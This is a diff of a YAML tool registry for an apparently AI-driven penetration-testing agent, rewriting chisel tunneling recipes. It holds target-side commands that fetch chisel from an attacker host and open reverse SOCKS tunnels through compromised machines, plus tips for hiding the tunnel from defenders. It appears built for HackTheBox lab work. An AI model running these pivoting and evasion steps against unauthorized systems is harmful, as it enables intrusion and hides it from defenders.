+        separate tool-runner spawn can extract the fingerprint via `grep -oE ''Fingerprint [a-zA-Z0-9/+=]+'' /session/output/chisel/server-<port>.log
+        | awk ''{print $2}''`. Container holds for max_runtime_seconds (24h default). Plugin defaults to --network=host so
+        the chisel port (8080 etc.) is reachable from tun0 / target''s network. Verified empirically 2026-05-10: fingerprint
+        emitted within <2s of startup, length 44 (base64-encoded SHA256).'
+    - name: Pattern C2 — extract fingerprint from server log (for client --fingerprint)
+      binary: bash
+      command: -c 'grep -oE "Fingerprint [a-zA-Z0-9/+=]+" /session/output/chisel/server-<port>.log | head -1 | awk "{print
+        \$2}"'
+      when: After Pattern C1 has started, extract the server's ECDSA public-key fingerprint (44 chars base64) from the log.
+        The output is the value the agent passes to the target's chisel client invocation as `--fingerprint <value>` for MITM
+        protection. The fingerprint stays stable for the server's lifetime — capture once on startup, reuse for any client
+        connections to this same server. Returns empty if server hasn't started yet (race) — Pattern C1's sleep+grep loop
+        avoids this.
+    - name: Pattern C3 — chisel client (agent-side, connect to remote chisel server)
+      binary: bash
+      command: -c 'mkdir -p /session/output/chisel && chisel client --fingerprint <server_fingerprint> http://<server_host>:<server_port>
+        <remote_spec> 2>&1 | tee /session/output/chisel/client-<id>.log'
+      when: 'Run the AGENT as a chisel client connecting to a known chisel server elsewhere. <remote_spec> is one of: (a)
+        `<local-port>` for forward (server-side->local), (b) `R:<remote-port>:<host>:<port>` for reverse, (c) `<local-port>:socks`
+        for SOCKS through the server. Less common than C1 since HTB-style flows usually run server agent-side + client on
+        the target. <id> is something like ''forward-9999'' or ''socks-1080'' so the log filename is unique. Auto-reconnect
+        built into chisel.'
+    - name: Pattern C4 — close chisel server / client via docker kill
+      binary: bash
+      command: -c 'docker ps --filter ancestor=ghcr.io/silicon-works/mcp-tools-chisel:latest --format "{{.ID}} {{.Names}}"
+        | head'
+      when: 'First list active chisel containers; agent picks the one to close. Second invocation (separate tool-runner spawn):
+        `binary: bash, command: -c ''docker kill <container_name>''` to terminate. Removes /session/output/chisel/<id>.log
+        on docker side but the host''s bind-mounted log persists. Alternative: max_runtime_seconds cap (24h default) self-terminates.
+        Replaces the legacy wrapper''s `close <id>` and `force_restart` methods.'
+    - name: Pattern C5 — list active chisel processes via filesystem
+      binary: bash
+      command: -c 'ls -la /session/output/chisel/ 2>/dev/null'
+      when: Enumerate active chisel processes by their log files. Each Pattern C1 / C3 invocation writes server-<port>.log
+        or client-<id>.log to /session/output/chisel/. Empty / missing dir = no active processes. Replaces the legacy wrapper's
+        `list` method. Filesystem-tracked, no in-memory dict — agent reads it on-demand from any tool-runner spawn.
+    - name: Pattern C6 — TLS-encrypted chisel server (--keyfile for cert pinning)
+      binary: bash
+      command: -c 'mkdir -p /session/output/chisel && chisel server --reverse --socks5 --keyfile /session/output/chisel/server.key
+        --port <port> 2>&1 | tee /session/output/chisel/server-<port>.log'
+      when: 'Persistent ECDSA key (instead of random regenerated per startup) so the server''s fingerprint is stable across
+        container restarts. Agent pre-generates the key via `chisel server --keygen /session/output/chisel/server.key` ONCE
+        (single short-running call, server exits after keygen). Then C6 uses --keyfile. For full TLS-on-the-wire, add `--tls-cert
+        /session/output/chisel/cert.pem --tls-key /session/output/chisel/key.pem` (caller pre-generates with openssl). Note:
+        chisel''s intra-tunnel encryption (--key/--keygen) is independent of the outer HTTP transport — TLS-cert flags wrap
+        the whole thing in HTTPS.'
+    output_formats:
+    - flag: ''
+      format: text
+      preferred: true
+      notes: 'chisel writes all output to stderr (server startup, client connections, errors). Recipe pipes 2>&1 | tee to
+        /session/output/chisel/<id>.log for downstream parsing. Fingerprint line shape: `<timestamp> server: Fingerprint <base64-44-chars>`.'
+    common_options:
       server:
-        description: Start a chisel server that listens for client connections over HTTP/WebSocket. Runs `chisel server --host
-          <host> --port <port>` as a background process. The server accepts chisel client connections and multiplexes SSH-encrypted
-          tunnels over the HTTP transport. By default enables --reverse (allow reverse tunnels) and --socks5 (allow SOCKS
-          proxy) for maximum flexibility. Optional --auth enforces username:password authentication. Optional --backend proxies
-          non-chisel HTTP requests to a real web server, making the chisel server appear as a normal website. The server prints
-          its SSH fingerprint on startup — share this with clients for MITM detection. Runs indefinitely until closed via
-          the close method.
-        when_to_use: (1) First step before any chisel client connection — start the server on the attacker machine. (2) With
-          --reverse enabled to receive reverse tunnels from compromised hosts. (3) With --socks5 to allow clients to create
-          SOCKS proxies for pivoting. (4) With --backend to hide chisel behind a legitimate website on an engagement. (5)
-          With --auth when multiple operators share the same chisel server. (6) On a VPS or redirector that has HTTP/HTTPS
-          open when the target network blocks SSH.
-        required_ports: []
-        params:
-          port:
-            type: integer
-            default: 8080
-            description: HTTP listening port. Use 80 or 443 to blend with normal web traffic.
-          host:
-            type: string
-            default: 0.0.0.0
-            description: 'Network interface to bind to. Default: all interfaces.'
-          reverse:
-            type: boolean
-            default: true
-            description: 'Allow clients to use reverse port forwarding (R: prefix remotes).'
-          socks5:
-            type: boolean
-            default: true
-            description: Enable internal SOCKS5 proxy for clients.
-          auth:
-            type: string
-            description: Authentication in 'user:pass' format. Clients must match.
-          backend:
-            type: string
-            description: URL to proxy non-chisel requests to (e.g., 'http://example.com'). Hides chisel behind a real website.
-          verbose:
-            type: boolean
-            default: false
-            description: Enable verbose logging.
-        returns:
-          id:
-            type: string
-            description: Server process ID for list and close.
-          port:
-            type: integer
-            description: Port the server is listening on.
-          fingerprint:
-            type: string
-            description: SSH public key fingerprint (base64 SHA256). Share with clients for --fingerprint verification.
-          status:
-            type: string
-            description: Process status (running/exited).
-      client_forward:
-        description: 'Create a forward tunnel — the chisel client listens on a local port and forwards traffic through the
-          chisel server to a remote host:port. Runs `chisel client <server_url> <local_port>:<remote_host>:<remote_port>`
-          as a background process. Traffic flow: local_port → chisel client → HTTP/WebSocket → chisel server → remote_host:remote_port.
-          The remote_host is resolved from the server''s network perspective, so ''127.0.0.1'' means the server''s localhost
-          and internal IPs are reachable if the server can reach them. Auto-assigns local_port if set to 0. Client auto-reconnects
-          with exponential backoff on disconnection. Note: chisel''s --proxy flag (route client traffic through an HTTP CONNECT
-          proxy to reach the chisel server) is not exposed — use bash for proxy-chained scenarios.'
-        when_to_use: (1) To access a service on the chisel server's localhost (e.g., MySQL 3306, web app 8080) from the attacker
-          machine. (2) To reach internal network services that the chisel server can access but the attacker cannot directly.
-          (3) When SSH port forwarding is blocked but HTTP is open. (4) After running 'server' method — connect a forward
-          tunnel to it. (5) Use local_port=0 for auto-assignment when the specific port doesn't matter.
-        required_ports: []
-        params:
-          server_url:
-            type: string
-            required: true
-            description: Chisel server URL (e.g., 'http://10.10.16.24:8080'). Must be a running chisel server.
-          local_port:
-            type: integer
-            default: 0
-            description: Local port to listen on (0 = auto-assign).
-          remote_host:
-            type: string
-            default: 127.0.0.1
-            description: Remote host from server's perspective. '127.0.0.1' = server localhost. Set to internal IP for pivoting.
-          remote_port:
-            type: integer
-            required: true
-            description: Remote port to forward to.
-          auth:
-            type: string
-            description: Auth 'user:pass' matching server.
-          fingerprint:
-            type: string
-            description: Server fingerprint for MITM verification.
-          max_retry_count:
-            type: integer
-            default: 3
-            description: Max reconnection attempts. Chisel's default is unlimited retries, but this is capped to 3 to prevent
-              infinite hangs in MCP context. Set to 0 for unlimited.
-          verbose:
-            type: boolean
-            default: false
-            description: Verbose logging.
-        returns:
-          id:
-            type: string
-            description: Tunnel ID for list and close.
-          local_port:
-            type: integer
-            description: Local port the tunnel listens on.
-          connect_to:
-            type: string
-            description: Address to connect to (e.g., '127.0.0.1:9999').
-          mapping:
-            type: string
-            description: Chisel remote spec (e.g., '9999:127.0.0.1:3306').
-      client_reverse:
-        description: 'Create a reverse tunnel — the chisel SERVER listens on a port and forwards incoming traffic through
-          the tunnel to the CLIENT''s local service. Runs `chisel client <server_url> R:<remote_port>:<local_host>:<local_port>`
-          as a background process. Traffic flow: server:remote_port → HTTP/WebSocket → chisel client → local_host:local_port.
-          The chisel server must have --reverse enabled. Useful for exposing a compromised host''s local service back to the
-          attacker through HTTP. Note: chisel''s --proxy flag (route client traffic through an HTTP CONNECT proxy to reach
-          the chisel server) is not exposed — use bash for proxy-chained scenarios.'
-        when_to_use: (1) To expose a service running on the compromised host (e.g., a reverse shell listener) back to the
-          attacker via the chisel server. (2) When the compromised host can reach the chisel server over HTTP but the attacker
-          can't reach the compromised host directly. (3) For callback channels that traverse firewalls — outbound HTTP from
-          target → chisel server → reverse tunnel back to target's local service. (4) Use with R:2222:localhost:22 to get
-          SSH access to a host that only has outbound HTTP.
-        required_ports: []
-        params:
-          server_url:
-            type: string
-            required: true
-            description: Chisel server URL. Server must have --reverse enabled.
-          remote_port:
-            type: integer
-            required: true
-            description: Port the SERVER will listen on. Incoming connections here are tunneled to the client.
-          local_host:
-            type: string
-            default: 127.0.0.1
-            description: 'Local host to forward to (client-side). Default: client''s localhost.'
-          local_port:
-            type: integer
-            required: true
-            description: Local port on the client side. Traffic from server:remote_port reaches this port.
-          auth:
-            type: string
-            description: Auth 'user:pass' matching server.
-          fingerprint:
-            type: string
-            description: Server fingerprint.
-          max_retry_count:
-            type: integer
-            default: 3
-            description: Max reconnection attempts. Chisel's default is unlimited retries, but this is capped to 3 to prevent
-              infinite hangs in MCP context. Set to 0 for unlimited.
-          verbose:
-            type: boolean
-            default: false
-            description: Verbose logging.
-        returns:
-          id:
-            type: string
-            description: Tunnel ID.
-          remote_port:
-            type: integer
-            description: Port the server is listening on.
-          server_listens_on:
-            type: string
-            description: Server-side listener address (e.g., '0.0.0.0:2222').
-          mapping:
-            type: string
-            description: Chisel remote spec (e.g., 'R:2222:127.0.0.1:22').
-      client_socks:
-        description: 'Create a SOCKS5 proxy through a chisel server — all traffic sent through the local SOCKS port is tunneled
-          over HTTP to the chisel server and exits from the server''s network. Runs `chisel client <server_url> <socks_port>:socks`
-          as a background process. The chisel server must have --socks5 enabled. Use the returned proxy_url with proxychains
-          or tool-specific SOCKS settings to route traffic through the server''s network. Enables full network pivoting —
-          any tool that supports SOCKS5 can reach any host the chisel server can reach. Note: chisel''s --proxy flag (route
-          client traffic through an HTTP CONNECT proxy to reach the chisel server) is not exposed — use bash for proxy-chained
-          scenarios.'
-        when_to_use: (1) When you need to reach multiple services on an internal network through a compromised host over HTTP.
-          (2) Instead of creating individual forward tunnels — one SOCKS proxy handles all destinations. (3) For network scanning
-          through the tunnel — set up SOCKS then use nmap with proxychains. (4) When SSH is blocked but HTTP is open and you
-          need SOCKS-style pivoting. (5) Default port 1080 — configure proxychains to use socks5://127.0.0.1:1080.
-        required_ports: []
-        params:
-          server_url:
-            type: string
-            required: true
-            description: Chisel server URL. Server must have --socks5 enabled.
-          socks_port:
-            type: integer
-            default: 1080
-            description: Local port for the SOCKS5 proxy.
-          auth:
-            type: string
-            description: Auth 'user:pass' matching server.
-          fingerprint:
-            type: string
-            description: Server fingerprint.
-          max_retry_count:
-            type: integer
-            default: 3
-            description: Max reconnection attempts. Chisel's default is unlimited retries, but this is capped to 3 to prevent
-              infinite hangs in MCP context. Set to 0 for unlimited.
-          verbose:
-            type: boolean
-            default: false
-            description: Verbose logging.
-        returns:
-          id:
-            type: string
-            description: Tunnel ID.
-          socks_port:
-            type: integer
-            description: Local SOCKS5 proxy port.
-          proxy_url:
-            type: string
-            description: SOCKS5 proxy URL (e.g., 'socks5://127.0.0.1:1080'). Use in proxychains or tool configs.
-      list:
-        description: List all active chisel servers and client tunnels with their type, ports, mappings, and process status.
-          Automatically prunes dead processes from the tracking list.
-        when_to_use: To check which chisel processes are running, verify tunnel status, find local ports or process IDs.
-        required_ports: []
-        params: {}
-        returns:
-          processes:
-            type: array
-            description: 'Array of active process objects. Each has: id, type (server/forward/reverse/socks), ports, mappings,
-              status.'
-          count:
-            type: integer
-            description: Number of active processes.
-      close:
-        description: Close a specific chisel server or client tunnel by its process ID. Sends SIGTERM then SIGKILL after 5
-          seconds if needed. Frees the ports used by the process.
-        when_to_use: When a specific tunnel or server is no longer needed. Free ports for reuse.
-        required_ports: []
-        params:
-          id:
-            type: string
-            required: true
-            description: Process ID to close (from list output, e.g., 'server-1', 'fwd-2').
-        returns:
-          id:
-            type: string
-            description: ID of the closed process.
-          type:
-            type: string
-            description: Type of the closed process (server/forward/reverse/socks).
-          status:
-            type: string
-            description: Always 'closed'.
+      - '--port, -p PORT: HTTP listening port (default 8080). Use 80 or 443 to blend with normal web traffic.'
+      - '--host HOST: bind interface (default 0.0.0.0)'
+      - '--reverse: allow clients to use R: reverse port forwarding (recommended ON for HTB pivoting)'
+      - '--socks5: enable internal SOCKS5 proxy for clients (recommended ON for pivoting)'
+      - '--auth user:pass: enforce authentication (multi-operator scenarios)'
+      - '--backend URL: proxy non-chisel HTTP requests to a real backend (hides chisel behind a legitimate website)'
+      - '--keygen PATH: write a new ECDSA private key to PATH (run once, then reuse with --keyfile)'
+      - '--keyfile PATH: use a persistent ECDSA key — fingerprint stays stable across restarts'
+      - '--tls-cert PATH, --tls-key PATH: wrap chisel in HTTPS (need separate cert+key generated via openssl)'
+      - '-v: verbose logging'
+      client:
+      - '--fingerprint FP: required for MITM protection — pass server''s fingerprint from Pattern C2'
+      - '--auth user:pass: match server''s --auth'
+      - '--header NAME=VALUE: custom HTTP header (e.g. for CDN bypass)'
+      - '--proxy URL: route client traffic through an HTTP CONNECT proxy to reach the chisel server'
+      - '--max-retry-count N: cap retries (chisel default is unlimited — set explicitly)'
+      - 'remote specs: <lport>:<rhost>:<rport>/tcp|udp (forward), R:<rport>:<host>:<port> (reverse), <lport>:socks (SOCKS
+        through server), R:1080:socks (server-side SOCKS exit back to client)'
+    gotchas:
+    - ENGAGEMENT-LIFETIME DAEMON (not time-bounded). chisel server runs FOREVER — max_runtime_seconds is the cli_in_container
+      kill switch (default 24h). For shorter sessions, prefix with `timeout NN`. Unlike responder (always wrapped with timeout
+      for capture window), chisel typically runs the full engagement duration so the default max_runtime is appropriate.
+    - 'FINGERPRINT EXTRACTION: chisel server emits ''Fingerprint <base64-44>'' on stderr at startup (within ~2s). Recipe captures
+      via `2>&1 | tee /session/output/chisel/server-<port>.log` so a separate tool-runner spawn can grep it later. Grep recipe:
+      `grep -oE ''Fingerprint [a-zA-Z0-9/+=]+'' /session/output/chisel/server-<port>.log | head -1 | awk ''{print $2}''`.
+      The fingerprint contains base64 chars including `/`, `+`, `=` — use [a-zA-Z0-9/+=]+ in regex, NOT [a-zA-Z0-9:]+ (the
+      latter cuts at `/`).'
+    - 'FINGERPRINT REGENERATION: by default chisel server generates a NEW ECDSA key each startup, so fingerprint CHANGES between
+      restarts. For stable fingerprint across restarts (when target''s chisel client has a hardcoded --fingerprint), pre-generate
+      via `chisel server --keygen /session/output/chisel/server.key` ONCE, then run subsequent servers with `--keyfile /session/output/chisel/server.key`
+      (Pattern C6). The keygen call short-exits — does NOT start a server. Useful when the engagement spans multiple agent
+      sessions / container restarts.'
+    - 'AGENT-SIDE vs TARGET-SIDE chisel — HTB typical: agent runs SERVER (Pattern C1) in a persistent kind:cli container;
+      agent uploads chisel binary to compromised target via existing reverse shell (nc held-listener) or scp (ssh ControlMaster);
+      target''s shell runs `chisel client http://<attacker>:8080 R:1080:socks --fingerprint <fp>` from inside the held shell
+      — this is NOT a cli_in_container invocation, it''s a command sent into the target''s shell. The R:1080:socks pattern
+      exposes the target''s network as a SOCKS proxy on attacker''s localhost:1080.'
+    - 'DOWNLOAD CHISEL TO TARGET: target needs the chisel binary. Three common flows: (1) `wget http://<attacker>:8000/chisel`
+      if agent serves it via `python3 -m http.server` (use the `nc` tool''s http-file-server usage_pattern), (2) `scp` via
+      ssh ControlMaster if SSH is available, (3) base64-encoded write through the held shell if file transfer paths are blocked.
+      The agent''s own chisel binary is at /usr/local/bin/chisel inside the chisel container — copy it out to /session/output/chisel/chisel-bin
+      first via `cp /usr/local/bin/chisel /session/output/chisel/chisel-bin` to make it available for upload.'
+    - 'PORT REACHABILITY across containers: plugin defaults to --network=host (manager.ts:382) so chisel server''s port (e.g.
+      18080) is reachable from sibling tool-runner spawn containers as `127.0.0.1:18080`. Verified empirically 2026-05-10
+      — separate container''s curl --socks5 127.0.0.1:11080 fetched example.com via the tunnel correctly. NO cross-container
+      port mapping needed; --network=host handles it.'
+    - 'SOCKS REACHABILITY for proxychains: once Pattern C1 server + target-side client are running with R:1080:socks remote
+      spec, the agent''s tools (nmap, curl, sqlmap, ssh) can use proxychains to route through the tunnel. proxychains config:
+      `socks5 127.0.0.1 1080` (server''s R: rebound the target-side SOCKS to attacker''s 1080). Verify connectivity with `nc
+      -zv 127.0.0.1 1080` from a sibling spawn before relying on the route.'
+    - 'CLOSE A SPECIFIC CHISEL CONTAINER: `docker kill <container_id>` from a separate bash tool spawn. Container IDs visible
+      via `docker ps --filter ancestor=ghcr.io/silicon-works/mcp-tools-chisel:latest`. Alternative: max_runtime_seconds cap
+      (24h default) self-terminates. Replaces the legacy wrapper''s `close` and `force_restart` methods. Closing the SERVER
+      container kills all clients connecting through it (they reconnect-and-fail via chisel''s auto-retry until they give
+      up).'
+    - 'LIST ACTIVE PROCESSES: `ls /session/output/chisel/` shows log files (server-<port>.log + client-<id>.log) for each
+      spawn. Each Pattern C1 / C3 invocation persists its log file. Replaces the legacy wrapper''s `list` method — filesystem-tracked
+      instead of in-memory dict, so any sibling spawn can enumerate.'
+    - 'DON''T CONFUSE WITH ssh TUNNEL: when SSH is available, ssh kind:cli v3.0 Patterns T1/T2/T3 (-L/-D/-R via ControlMaster)
+      are the right tool — no server-side process needed, faster setup, more reliable on modern targets. Only use chisel when
+      port 22 is blocked outbound from the target / inbound to attacker but HTTP is open. The legacy `tunnel` (kind:mcp) tool
+      was retired May 2026 — all SSH-tunneling absorbed into ssh.'
+    - 'RECONNECT BEHAVIOR (built-in): chisel client auto-reconnects with exponential backoff (100ms→5min). If the server container
+      dies + restarts, the client picks up automatically (within minutes). BUT: if the server''s --keyfile is NOT persistent,
+      the fingerprint CHANGES on restart and the client rejects the new server (fingerprint mismatch). For stable reconnect
+      across restarts, ALWAYS use --keyfile per gotcha #3.'
+    - 'BACKEND PROXY (--backend) HIDES CHISEL: useful for engagements where a tunnel exposed on port 80 would tip off defenders.
+      `chisel server --backend http://example.com:80` proxies non-chisel HTTP requests to example.com — any web crawler hitting
+      the chisel port sees a normal site. The chisel WebSocket upgrade path is the only entry. Increases stealth but adds
+      latency.'
+    - 'TARGET ARCHITECTURE: image ships chisel for linux_amd64 only (at /usr/local/bin/chisel). 32-bit targets need chisel_<ver>_linux_386
+      (verified live 2026-05-11 on HTB Lame i686 — upload of amd64 binary failed with ''cannot execute binary file''). ARM
+      targets need linux_arm64 or linux_arm. Agent detects target arch via `uname -m` from the target''s held shell, then
+      downloads the right binary from `https://github.com/jpillora/chisel/releases/download/v1.11.4/chisel_1.11.4_linux_<arch>.gz`
+      (use the `nc` HTTP file server pattern to host it OR scp via ssh ControlMaster).'
+    - 'TARGET KERNEL VERSION: chisel is built with modern Go (1.25+) which requires Linux kernel ≥ 2.6.32 (~2009). Targets
+      older than that (Ubuntu 8.04 LTS / RHEL 5 era / Lame''s 2.6.24) crash on goroutine setup with `golang.org/x/sync/errgroup.(*Group).Go`
+      stack trace. Verified failure mode on HTB Lame 2026-05-11. Modern engagement targets (any 2010+ Linux) are unaffected.
+      For Lame-class ancient targets, fall back to ssh tunnel patterns (ssh kind:cli v3.0 -L/-D/-R) or static-Go chisel built
+      for older kernels (out of scope here).'
+    failure_signatures:
+    - signal: 'bind: address already in use'
+      layer: tcp
+      remediation: Another process (likely a previous chisel server, or a host service) bound the port. Pick a different port
+        (chisel server --port N+1) or `docker kill` the stale chisel container first (see CLOSE gotcha).
+    - signal: Fingerprint mismatch
+      layer: auth
+      remediation: 'Client''s --fingerprint doesn''t match the server''s current fingerprint. Either: (a) server restarted
+        without --keyfile and regenerated its key — re-extract fingerprint via Pattern C2 and update client; (b) man-in-the-middle
+        (rare on lab/HTB) — re-check the chain. Use Pattern C6 (--keyfile persistence) to prevent re-key on restart.'
+    - signal: connection refused
+      layer: tcp
+      remediation: 'Client can''t reach server. Check: (1) server actually running (`ls /session/output/chisel/server-<port>.log`
+        shows recent activity), (2) target host''s outbound HTTP not blocked, (3) attacker''s <port> actually exposed externally
+        (in HTB / tun0 context this is the user''s tun0 IP, not 127.0.0.1).'
+    - signal: 'tls: failed to verify certificate'
+      layer: tls
+      remediation: When using --tls-cert / --tls-key on server, client may need `--ca-cert` flag to trust the self-signed
+        CA. For lab use, client's `--tls-skip-verify` (chisel client flag) accepts any cert.
+    - signal: EOF on tunnel
+      layer: transport
+      remediation: 'Server died or network dropped. chisel client auto-retries with exponential backoff — wait up to 5min.
+        If persistent, check server container status: `docker ps --filter ancestor=ghcr.io/silicon-works/mcp-tools-chisel:latest`.
+        Restart server if needed (Pattern C1 + re-extract fingerprint).'
+    help_commands:
+    - name: chisel — top-level help
+      binary: chisel
+      command: --help
+      when: Print chisel's top-level usage. target=null.
+    - name: chisel — server subcommand help
+      binary: chisel
+      command: server --help
+      when: Print full chisel server flag list. target=null.
+    - name: chisel — client subcommand help
+      binary: chisel
+      command: client --help
+      when: Print full chisel client flag list including remote spec syntax. target=null.
   cloudfox:
     name: cloudfox
     kind: cli
@@ -21322,10 +21506,10 @@ tools:
         covers shell-session's listen / shell_exec / upgrade_shell methods. Once a foothold yields SSH credentials, pivot
         from `nc` reverse-shell to `ssh` ControlMaster for a more stable persistent session.
     - tool: chisel
-      reason: Use `chisel` (kind:mcp) for HTTP-based tunneling when SSH is blocked / unavailable but HTTP is open. ssh-based
-        tunneling (now lifted from reject_flags as of v3.0, May 2026) is in scope HERE via Patterns T1/T2/T3; use chisel as
-        the SSH-unavailable fallback. The legacy `tunnel` (kind:mcp) tool was retired May 2026 — its 5 SSH-tunneling methods
-        now live in this tool.
+      reason: Use `chisel` (kind:cli v1.11.4, May 2026 — flipped from kind:mcp in Phase B) for HTTP-based tunneling when SSH
+        is blocked / unavailable but HTTP is open. ssh-based tunneling (now lifted from reject_flags as of v3.0, May 2026)
+        is in scope HERE via Patterns T1/T2/T3; use chisel as the SSH-unavailable fallback. The legacy `tunnel` (kind:mcp)
+        tool was retired May 2026 — its 5 SSH-tunneling methods now live in this tool.
     - tool: hydra
       reason: Use hydra ssh://host for credential brute-forcing or password spraying. This `ssh` tool requires KNOWN credentials
         (key or password); hydra discovers them. Once hydra surfaces a working pair, hand them to ssh / scp for one-shot exec
